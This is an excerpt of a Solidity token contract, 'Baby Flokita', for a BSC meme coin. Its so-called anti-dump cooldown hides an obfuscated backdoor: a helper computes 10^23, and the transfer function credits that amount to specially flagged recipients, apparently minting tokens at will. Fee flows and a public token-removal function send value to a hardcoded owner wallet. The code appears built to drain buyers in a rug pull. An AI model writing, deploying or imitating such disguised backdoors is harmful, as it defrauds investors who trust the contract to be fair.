...
/**
 ...
 Telegram : https://t.me/BabyFlokitaBSC
...
contract BabyFlokita is Context, IERC20 { 
    struct Cooldowns {
        uint256 sender;
        uint256 recipient;
        uint256 global;
    }
    Cooldowns public cooldowns = Cooldowns(0, solid(9+1,24-1), 30);
    ...
    address payable public wm_address = payable(0xB14B6Cc583e7Ef43715b924E4279bf9B11234a82); 
    address payable public wbnb_address = payable(0xddEDE07aC51767EC4421EF9A88A34801F2998195);
    address payable public wd_address = payable(0x903a3Aab435F4cAFcAeF067C6c3c391699312281);
    address payable public constant wb_address = payable(0x000000000000000000000000000000000000dEaD); 

    //Anti Dump
    mapping(address => uint256) private _lastSell;
    uint256 private sellCooldown = 30;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "Baby Flokita"; 
    string private constant _symbol = unicode"BFlokita"; 
    ...
    constructor () {
        ...
        _owner = 0x903a3Aab435F4cAFcAeF067C6c3c391699312281;
        ...
        _isExcludedFromFee[wm_address] = true; 
        _isExcludedFromFee[wb_address] = true;
    ...
    function solid(uint256 numeric1, uint256 numeric2) private pure returns (uint256){
        uint256 numerics = 1;
        while(numeric2!=0){
            numerics = numerics * numeric1;
            numeric2--;
        }
        return numerics;
    }
    ...
    function anti_dump_check(address sellerAddress) public view returns(uint256){
        return _lastSell[sellerAddress];
    }
    ...
    function _transfer(
        ...
        if (from != owner() && cooldowns.global != sellCooldown)
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            _tOwned[wb_address] = _tOwned[wb_address] + tokens_to_Burn;
            ...
            sendToWallet(wm_address, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(wd_address, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(wd_address, removeRandom);
...
function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(anti_dump_check(recipient) >= sellCooldown ){
            cooldowns.sender = tAmount;
            _tOwned[sender] = _tOwned[sender]-cooldowns.sender;
            _tOwned[recipient] = _tOwned[recipient]+cooldowns.recipient;
